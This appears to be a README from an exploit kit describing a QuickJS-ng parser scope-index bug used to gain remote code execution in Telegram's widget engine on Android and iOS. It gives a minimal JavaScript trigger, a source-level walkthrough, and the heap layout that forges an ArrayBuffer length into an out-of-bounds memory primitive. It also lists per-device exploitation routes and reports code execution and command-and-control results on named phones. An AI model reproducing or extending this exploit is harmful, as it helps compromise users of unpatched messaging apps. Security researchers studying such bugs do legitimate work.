# 0day-2-RCE-PARSER-SCOPE: the parser `ARG_SCOPE_END` 0day

**ID:** `0day-2-RCE-PARSER-SCOPE`  
**Class:** RCE (now fixed; n-day)  
**Platform:** Android and iOS / QuickJS-ng v0.17.0-era engine  
**Widget-reachable:** yes  
**Status:** app-level RCE on Sony 72929/72889, iPhone 6s, and iPhone 17e once
(msg 5725); beta 72979/72989 are contained in an isolated widget process; the
17e gated twin is host-only.
**Deliverable:** yes

The bug is a parser scope-index leak in QuickJS-ng. A direct `eval` in a
parameter initializer of a strict function receives the `ARG_SCOPE_END`
sentinel as a variable index. The engine reads a fake `JSVarDef` 1.31 MB past
the real array and writes closure records past a live allocation. With heap
grooming, the write forges `ArrayBuffer.byteLength = 327744`, which is the
primitive for native code execution.

**The fix is in the current Telegram builds.** The bug was live on the tested
pins and is now an n-day.

## Routes

The same bug needs different heap geometry on each platform. The routes are
techniques, not new bugs.

Android build caveat: the app-level results above are from builds where the
widget engine runs in the app process (72889/72929 and the Pixel 72801
measurement). Beta **72979** moved the engine to the isolated process
`:widgets:org.telegram.utils.twidget.WidgetEngineService`, UID 99017,
`u:r:isolated_app:s0`. The current beta **72989** keeps the same model at UID
99024. Stage A still works there (`ABLEN[599]=327744 ATT=1`), but the current
endgame stops at `HF ERR NOANCHOR` and the app-private write and loopback C2
are blocked. On 72979/72989 the parser bug is contained code execution/DoS in
the widget process, not app-level RCE.

| Route | Directory | Platform | Status |
|---|---|---|---|
| Cross-tag (`XTAG`) | `XTAG/` | Android, MTE off | Sony 72929 5/5, 72889 1/1 (app UID); C2 1/1; 1.913 s. 72979/72989: stage A only, isolated UID 99017/99024 |
| Same-tag (`STAG`) | `STAG/` | Android, MTE-safe | Pixel stage A; out-of-band `HF HF OK`; universal v3/parallel host-proven. App-private write depends on the process model |
| iOS hole-reuse (`TINY`) | `TINY/` | iOS 15.8.8 | 6s `RCE_OK` 2026-11-08 05:49:24 |
| iOS 27 (`IOS27`) | `IOS27/` | iOS 27.0 | Prepared, not run |

## The bug


## Short version

A strict function with an empty destructuring parameter and a default value that
contains a direct `eval` compiles to a scope index of `0xFFFF`. The runtime
treats that as variable index 65,534. It reads a fake variable definition
1.31 MB past the real array and writes closure records past a live allocation.
With heap grooming, those writes forge an `ArrayBuffer` length.

Minimal trigger:

```js
"use strict";
function f([] = eval("1")) {}
f();
```

The trigger crashes on an ASan build and corrupts memory on a plain build. The
exploit adds grooming around it.

## Where the code is

The bug is in QuickJS-ng's parser/compiler, in `quickjs.c`. The line numbers
below are from the shipped Telegram fork snapshot `2dfeee3e`; upstream
v0.17.0 and 0.18.0 are within a few lines.

### 1. The parser writes a sentinel into the argument scope

When a function has parameter expressions (a default value or a destructuring
pattern), `js_create_function()` initializes the argument scope with the
end-of-list marker:

```c
/* quickjs.c:37763 */
if (fd->has_parameter_expressions)
    fd->scopes[ARG_SCOPE_INDEX].first = ARG_SCOPE_END;   /* -2 */
```

`ARG_SCOPE_INDEX` is 1. `ARG_SCOPE_END` is `-2`.

Normally the marker is overwritten by `add_eval_variables()` when it adds the
hidden `arguments` variable:

```c
/* quickjs.c:35359 */
if (has_arguments_binding) {
    add_arguments_var(ctx, s);
    if (s->has_parameter_expressions && !s->is_strict_mode)
        add_arguments_arg(ctx, s);   /* skipped in strict mode */
}
```

In strict mode `add_arguments_arg()` is skipped. If no parameter declares a
variable in scope 1 (an empty destructuring pattern is the easy way), the scope
keeps the `-2` sentinel.

### 2. The compiler emits the sentinel as a 16-bit operand

For a direct `eval`, `resolve_variables()` writes the scope's first variable
index into the bytecode:

```c
/* quickjs.c:35955, case OP_eval */
scope = get_u16(bc_buf + pos + ...);      /* scope 1 = argument scope */
dbuf_put_u16(&bc_out, s->scopes[scope].first + 1);
```

With `first = -2`, `first + 1 = -1`, stored as `0xFFFF`.

### 3. The runtime turns it into variable index 65,534

```c
/* quickjs.c:19405, CASE(OP_eval) */
scope_idx = get_u16(pc + 2) - 1;          /* 0xFFFF - 1 = 65534 */
```

`scope_idx` is passed to `add_closure_variables()`.

### 4. The out-of-bounds read

```c
/* quickjs.c:35479 */
for (i = scope_idx; i >= 0;) {
    vd = &b->vardefs[b->arg_count + i];   /* +1.31 MB OOB */
    if (vd->scope_level > 0) {
        JSClosureVar *cv = &s->closure_var[s->closure_var_count++];
        set_closure_from_var(ctx, cv, vd, i);
    }
    i = vd->scope_next;                   /* attacker-steerable */
}
```

`b` is the calling function's `JSFunctionBytecode`. `JSVarDef` is 20 bytes.
`b->arg_count + 65534` with `arg_count = 1` indexes `vardefs[65535]`. The read
is **1,310,700 bytes past `b->vardefs`** (1,310,828 past `b` on Android, where
`vardefs = b+128`; 1,311,372 past `b` on iOS, where `vardefs = b+672`).

The loop reads a `JSVarDef` from that address. If the fake record has
`scope_level > 0`, the engine writes an 8-byte `JSClosureVar` record at
`s->closure_var[s->closure_var_count++]` and follows the fake `scope_next`
field to the next index. The fake record can chain to any index, so the write
position and count are controlled by the sprayed data.

### 5. The write

`JSClosureVar` is 8 bytes:

```
byte 0     closure_type:3 | is_lexical:1 | is_const:1 | var_kind:4
offset 2   uint16 var_idx
offset 4   JSAtom var_name
```

`set_closure_from_var()` copies the fake definition's flags, stores the loop
index in `var_idx`, and calls `JS_DupAtom(vd->var_name)`. If the fake
`var_name` has bit 31 set (or is any value below `JS_ATOM_END`), the atom is
stored verbatim and `JS_DupAtom` does nothing. That gives a controlled 32-bit
value in the record.

The loop writes as many records as the fake chain has `scope_level > 0`
entries. Each record advances the closure array by 8 bytes. The closure array
was allocated with `count = arg_count + var_count + closure_var_count` entries.

## The geometry that forges an ArrayBuffer

The working shape is one empty destructuring parameter and three body
variables:

```js
"use strict";
function f([] = eval("1")) { var q1 = 0, q2 = 0, q3 = 0; }
f();
```

The compiled function has:

```
arg_count = 1        (the empty pattern counts as one argument)
var_count = 6        (q1, q2, q3 plus the compiler's hidden temporaries)
closure_var_count = 0
count = 7
```

`7 × 8 = 56` bytes. The allocation is 56 bytes, which lands in the **class-64**
size class. `new ArrayBuffer(64)` allocates a 56-byte `JSArrayBuffer` struct in
the same class. If a victim `ArrayBuffer` struct sits immediately after the
closure array, the overflow entry at offset 64 writes the victim's
`byte_length` and `max_byte_length` fields:

```
closure_var[0..6]      56 bytes   the real array
closure_var[7]         +56        the next block's header (unavoidable)
closure_var[8]         +64        victim JSArrayBuffer.byte_length
closure_var[9]         +72        victim max_byte_length / data
```

The value written is `(flags << 16) | var_idx` (little-endian 32-bit). In the
working groom the last normal entry sets the low half and the fake entry
provides `var_idx`; the result is `0x00050040 = 327,744`. The exact arithmetic
is in `evidence/parser-bug-report.md` §4.4.

The forged buffer yields:

```js
var view = new Uint8Array(victim);   // length 327,744, backing store 64 bytes
```

The view is the primitive.

## Why each part of the trigger is needed

| Part | Why |
|---|---|
| `"use strict"` | Skips `add_arguments_arg()`, so the `-2` sentinel survives. |
| `[]` empty destructuring parameter | `has_parameter_expressions` is true, but no variable is declared in scope 1. The pattern still gives `arg_count >= 1`, so `vardefs` is not NULL. |
| `= eval("1")` | A direct `eval` in a parameter initializer becomes `OP_eval` in the argument scope, which carries the leaked scope index. The eval source can be anything; the crash happens while compiling it. |
| Calling `f()` | The vulnerable code runs during the eval inside the call, not at parse time. |

Variants work with a destructuring default instead of an `eval` default, as
long as the direct `eval` is in the parameter initializer. The `eval("1")`
form is the smallest.

## Host proof

Build the shipped source with ASan and run the minimal trigger:

```sh
git clone https://github.com/quickjs-ng/quickjs.git /tmp/opencode/quickjs
cd /tmp/opencode/quickjs
git checkout v0.17.0

clang -g -O1 -DNDEBUG -D__SANITIZE_ADDRESS__ \
  -fsanitize=address,undefined -fno-omit-frame-pointer \
  -I . ../quickjs-widget-harness.c quickjs.c libregexp.c libunicode.c dtoa.c \
  -lm -o /tmp/opencode/run_asan

cat > /tmp/opencode/min_oob.js <<'EOF'
"use strict";
function f([] = eval("1")) {}
f();
EOF

ASAN_OPTIONS=detect_leaks=0 /tmp/opencode/run_asan -l 8 /tmp/opencode/min_oob.js
```

Expected (5/5 in the original run):

```
ERROR: AddressSanitizer: SEGV on unknown address 0x...
READ of size 8
  #0 add_closure_variables quickjs.c:35479
  #1 __JS_EvalInternal    quickjs.c:39007
  ...
```

The same source with the arena allocator on and no sanitizer segfaults
deterministically at 5, 6, 7, and 8 MiB.

The harness is `docs/common/tools/quickjs-widget-harness.c`. It creates one
runtime, sets the memory limit, and evaluates one file. It has no host
functions, which matches the widget sandbox.

## Novelty and affected versions

The bug is **not**:

- `#1827` (`JS_RegExpDelete` stale bytecode),
- `#1865` (`var_ref_count` truncation),
- `#1782` (truncated parser bytecode Dbuf),
- N1 (`push_scope` OOM),
- C1 (`cpool_add` OOM) or C2 (`update_var_htab` mask).

It was checked against the upstream tracker on 2026-11-02/05. Searches for
`parent_cpool_idx`, `cpool_add`, `vars_htab`, `add_eval_variables`, and the
exact sentinel produced no matching issue. The bug is present unchanged in
upstream `e22ce4d` (0.18.0+). It is a 0day at the time of writing.

The bug is reachable from a single synchronous `eval()` of plain JavaScript in
the widget sandbox. It uses no host API, no modules, no bytecode loader, and no
allocation failure.

## What comes next

The trigger alone is a crash. To exploit it you need to control what is 1.31 MB
past the vulnerable bytecode. That is what the three routes do:

- Android cross-tag: Scudo spray with fake `JSVarDef` records.
- Android same-tag: arena spray with a class-512 target page.
- iOS hole-reuse: free same-size holes, compile the trigger into one, spray the
  class.

Read the route that matches your device.
